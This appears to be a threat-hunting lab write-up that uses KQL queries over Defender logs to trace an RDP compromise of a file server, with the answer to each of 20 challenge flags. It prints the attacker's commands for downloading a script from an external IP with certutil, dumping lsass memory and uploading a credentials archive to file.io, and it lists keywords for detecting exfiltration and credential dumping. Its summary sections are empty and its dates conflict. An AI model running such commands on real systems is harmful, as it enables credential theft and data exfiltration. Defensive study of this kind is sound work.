# Threat-Hunting-Scenario-Cargo-Hold

## RDP Compromise Incident

**Report ID:** INC-2025-0612

**Analyst:** Nadezna Morris

**Date:** 06-December-2025

**Incident Date:** 22-December-2025

---

## Executive Summary



---

## 1. Findings

### **Key Indicators of Compromise (IOCs):**



---

***FLAG 1: INITIAL ACCESS - Return Connection Source***  

**Objective:**  After establishing initial access, sophisticated attackers often wait hours or days (dwell time) before continuing operations. They may rotate infrastructure between sessions to avoid detection.

**Flag:** `159.26.106.98`  
```
DeviceLogonEvents
| where DeviceName == "azuki-sl"
| where AccountName == "kenji.sato"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-30))
| where ActionType == "LogonSuccess"
| project TimeGenerated, DeviceName, AccountName, ActionType, RemoteDeviceName, RemoteIP
| order by TimeGenerated asc 
```
<img width="827" height="75" alt="image" src="https://github.com/user-attachments/assets/838d31f0-67aa-4c34-8117-a75b7c31db6f" />

---

***FLAG 2: LATERAL MOVEMENT - Compromised Device***  

**Objective:** Lateral movement targets are selected based on their access to sensitive data or network privileges. File servers are high-value targets containing business-critical information.

**Flag:** `azuki-fileserver01`
```
DeviceLogonEvents
| where DeviceName has_any ("azuki-")
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-30))
| project TimeGenerated, DeviceName, AccountName, ActionType, RemoteIP, InitiatingProcessAccountName
| order by TimeGenerated asc
```
<img width="926" height="117" alt="image" src="https://github.com/user-attachments/assets/4e8ba222-b97c-429d-ae1c-0989cbb868dc" />

---

***FLAG 3: LATERAL MOVEMENT - Compromised Account***

**Objective:** Identifying which credentials were compromised determines the scope of unauthorised access and guides remediation efforts.

**Flag:** `fileadmin`
```
DeviceLogonEvents
| where DeviceName == "azuki-fileserver01"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-30))
| where ActionType == "LogonSuccess"
| project TimeGenerated, DeviceName, AccountName, ActionType, RemoteIP, InitiatingProcessAccountName
| order by TimeGenerated asc
```
<img width="877" height="101" alt="image" src="https://github.com/user-attachments/assets/3c397329-d3ac-4bb6-b4fd-87cb0e0c7f2b" />

---

***FLAG 4: DISCOVERY - Share Enumeration Command***

**Objective:** Network share enumeration reveals available data repositories and helps attackers identify targets for collection and exfiltration.

**Flag:** `"net.exe" share`
```
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-30))
| where ProcessCommandLine  has_any ("net", "share")
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine, InitiatingProcessCommandLine, InitiatingProcessAccountName
| order by TimeGenerated asc
```
<img width="1160" height="82" alt="image" src="https://github.com/user-attachments/assets/d570d5d1-c5d2-4dd9-b4be-8ae263c97a1f" />

---

***FLAG 5: DISCOVERY - Remote Share Enumeration***

**Objective:** Attackers enumerate remote network shares to identify accessible file servers and data repositories across the network.

**Flag:** `"net.exe" view \\10.1.0.188`
```
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-30))
| where ProcessCommandLine has_any ("net view", "net share", "\\\\", "all", "local")
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine, AccountName
| order by TimeGenerated asc
```
<img width="740" height="72" alt="image" src="https://github.com/user-attachments/assets/1c5fc7ec-d508-4261-8878-cf195ef5652e" />

---

***FLAG 6: DISCOVERY - Privilege Enumeration***

**Objective:** Understanding current user privileges and group memberships helps attackers determine what actions they can perform and whether privilege escalation is needed.

**Flag:** `"whoami.exe" /all`
```
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-30))
| where ProcessCommandLine has_any ("whoami")
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine, AccountName
| order by TimeGenerated desc
```
<img width="712" height="75" alt="image" src="https://github.com/user-attachments/assets/b843d0e6-c798-4917-968f-3306e29c6612" />

---

***FLAG 7: DISCOVERY - Network Configuration Command***

**Objective:** Network configuration enumeration helps attackers understand the target environment, identify domain membership, and discover additional network segments.

**Flag:** `"ipconfig.exe" /all`
```
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-30))
| where ProcessCommandLine has_any ("ipconfig")
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine, AccountName
| order by TimeGenerated asc
```
<img width="712" height="72" alt="image" src="https://github.com/user-attachments/assets/aa706fd4-28b8-46fa-bc74-6c5a018763b4" />

---

***FLAG 8: DEFENSE EVASION - Directory Hiding Command***

**Objective:** Modifying file system attributes to hide directories prevents casual discovery by users and some security tools. Document the exact command line used.

**Flag:** `"attrib.exe" +h +s C:\Windows\Logs\CBS`
```
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-30))
| where FileName =~ "attrib.exe"
| where ProcessCommandLine has_any ("+h", "+s")
| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName
| order by TimeGenerated desc
```
<img width="937" height="72" alt="image" src="https://github.com/user-attachments/assets/67ce3ba0-b5d6-404f-9629-ce7cfcd66bc6" />

---

***FLAG 9: COLLECTION - Staging Directory Path***

**Objective:** Attackers establish staging locations to organise tools and stolen data before exfiltration. This directory path is a critical IOC.

**Flag:** `C:\Windows\Logs\CBS`
```
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-30))
| where FileName =~ "attrib.exe"
| where ProcessCommandLine has_any ("+h", "+s")
| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName
| order by TimeGenerated desc
```
<img width="937" height="72" alt="image" src="https://github.com/user-attachments/assets/67ce3ba0-b5d6-404f-9629-ce7cfcd66bc6" />

---

***FLAG 10: DEFENSE EVASION - Script Download Command***

**Objective:** Legitimate system utilities with network capabilities are frequently weaponized to download malware while evading detection.

**Flag:** `"certutil.exe" -urlcache -f http://78.141.196.6:7331/ex.ps1 C:\Windows\Logs\CBS\ex.ps1`
```
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-30))
| where ProcessCommandLine has_any ("certutil")
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```
<img width="962" height="95" alt="image" src="https://github.com/user-attachments/assets/72dab1ab-6a64-4ecd-9de0-9d83a89721db" />

---

***FLAG 11: COLLECTION - Credential File Discovery***

**Objective:** Credential files provide keys to the kingdom - enabling lateral movement and privilege escalation across the network.

**Flag:** `IT-Admin-Passwords.csv`
```
DeviceFileEvents
| where DeviceName == "azuki-fileserver01"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-30))
| where FileName has_any (".csv", ".xlsx")
| project TimeGenerated, DeviceName, FileName, InitiatingProcessCommandLine, FolderPath
| order by TimeGenerated asc
```
<img width="980" height="72" alt="image" src="https://github.com/user-attachments/assets/caf14d0e-4796-4769-9d98-0f9c560e4b85" />

---

***FLAG 12: COLLECTION - Recursive Copy Command***

**Objective:** Built-in system utilities are preferred for data staging as they're less likely to trigger security alerts. The exact command line reveals attacker methodology.

**Flag:** `"xcopy.exe" C:\FileShares\IT-Admin C:\Windows\Logs\CBS\it-admin /E /I /H /Y`
```
DeviceFileEvents
| where DeviceName == "azuki-fileserver01"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-30))
| where FileName =~ "IT-Admin-Passwords.csv"
| project TimeGenerated, DeviceName, FileName, InitiatingProcessCommandLine
| order by TimeGenerated asc
```
<img width="941" height="73" alt="image" src="https://github.com/user-attachments/assets/137eff8f-5fa9-4430-af6a-d5623bf831c9" />

---

***FLAG 13: COLLECTION - Compression Command***

**Objective:** Cross-platform compression tools indicate attacker sophistication. The full command line reveals the exact archiving methodology used.

**Flag:** `"tar.exe" -czf C:\Windows\Logs\CBS\credentials.tar.gz -C C:\Windows\Logs\CBS\it-admin .`
```
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-30))
| where ProcessCommandLine has_any (".tar", ".zip")
| project TimeGenerated, DeviceName, ProcessCommandLine, FolderPath
| order by TimeGenerated asc
```
<img width="1242" height="82" alt="image" src="https://github.com/user-attachments/assets/76cb8c8f-6dc8-436f-a339-0d258e03cc01" />

---

***FLAG 14: CREDENTIAL ACCESS - Renamed Tool***

**Objective:** Renaming credential dumping tools is a basic OPSEC practice to evade signature-based detection.

**Flag:** `pd.exe`
```
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-30))
| where ProcessCommandLine has_any ("lsass", "sekurlsa", "minidump", "procdump", "dump")
| project TimeGenerated, DeviceName, FolderPath, FileName, ProcessCommandLine
| order by TimeGenerated asc
```
<img width="1187" height="82" alt="image" src="https://github.com/user-attachments/assets/af206cea-2eb7-4981-ab2f-fdf932bc53bf" />

---

***FLAG 15: CREDENTIAL ACCESS - Memory Dump Command***

**Objective:** The complete process memory dump command line is critical evidence showing exactly how credentials were extracted.

**Flag:** `"pd.exe" -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp`
```
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-30))
| where ProcessCommandLine has_any ("lsass", "sekurlsa", "minidump", "procdump", "dump")
| project TimeGenerated, DeviceName, FolderPath, FileName, ProcessCommandLine
| order by TimeGenerated asc
```
<img width="1187" height="82" alt="image" src="https://github.com/user-attachments/assets/af206cea-2eb7-4981-ab2f-fdf932bc53bf" />

---

***FLAG 16: EXFILTRATION - Upload Command***

**Objective:** Command-line HTTP clients enable scriptable data transfers. The complete command syntax is essential for building detection rules.

**Flag:** `"curl.exe" -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io`
```
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-30))
| where ProcessCommandLine has_any ("https", "credentials")
| where FileName !startswith "updater"
| project TimeGenerated, DeviceName, ActionType, ProcessCommandLine, FolderPath
| order by TimeGenerated asc
```
<img width="1262" height="82" alt="image" src="https://github.com/user-attachments/assets/f60b2717-0505-4e5b-9738-24cb7ecc4ac8" />

---

***FLAG 17: EXFILTRATION - Cloud Service***

**Objective:** Cloud file sharing services provide convenient, anonymous exfiltration channels that blend with legitimate business traffic.

**Flag:** `file.io`
```
DeviceNetworkEvents
| where DeviceName == "azuki-fileserver01"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-30))
| where RemoteUrl has_any ("transfer.sh", "file.io", "gofile.io", "anonfiles.com", "temp.sh", "0x0.st", "pixeldrain.com", "ufile.io")
| project TimeGenerated, DeviceName, RemoteUrl, RemoteIP, InitiatingProcessCommandLine
| order by TimeGenerated desc
```
<img width="1112" height="112" alt="image" src="https://github.com/user-attachments/assets/928a3195-9e38-4b4f-af64-13e6fa4f60f4" />

---

***FLAG 18: PERSISTENCE - Registry Value Name***

**Objective:** Registry autorun keys provide reliable persistence that executes on every system startup or user logon.

**Flag:** `FileShareSync`
```
DeviceRegistryEvents
| where DeviceName == "azuki-fileserver01"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-30))
| where ActionType == "RegistryValueSet"
| where RegistryKey has_any (@"\CurrentVersion\Run")
| project TimeGenerated, DeviceName, RegistryKey, RegistryValueName, RegistryValueData
| order by TimeGenerated asc
```
<img width="1295" height="82" alt="image" src="https://github.com/user-attachments/assets/541872c6-2278-4acf-b76c-2f3a14810a8a" />

---

***FLAG 19: PERSISTENCE - Beacon Filename***

**Objective:** Process masquerading involves naming malicious files after legitimate Windows components to avoid suspicion.

**Flag:** `svchost.ps1`
```
DeviceRegistryEvents
| where DeviceName == "azuki-fileserver01"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-30))
| where ActionType == "RegistryValueSet"
| where RegistryKey has_any (@"\CurrentVersion\Run")
| project TimeGenerated, DeviceName, RegistryKey, RegistryValueName, RegistryValueData
| order by TimeGenerated asc
```
<img width="1295" height="82" alt="image" src="https://github.com/user-attachments/assets/541872c6-2278-4acf-b76c-2f3a14810a8a" />

---

***FLAG 20: ANTI-FORENSICS - History File Deletion***

**Objective:** PowerShell saves command history to persistent files that survive session termination. Attackers target these files to cover their tracks.

**Flag:** `ConsoleHost_history.txt`
```
DeviceFileEvents
| where DeviceName == "azuki-fileserver01"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-30))
| where ActionType has_any ("FileDeleted")
| where InitiatingProcessCommandLine has_any ("powershell")
| project TimeGenerated, DeviceName, FileName, InitiatingProcessCommandLine, FolderPath
| order by TimeGenerated asc
```
<img width="1342" height="82" alt="image" src="https://github.com/user-attachments/assets/fecf71bd-dd57-4db6-82d6-260ed03c9329" />

---

## 2. Investigation Summary



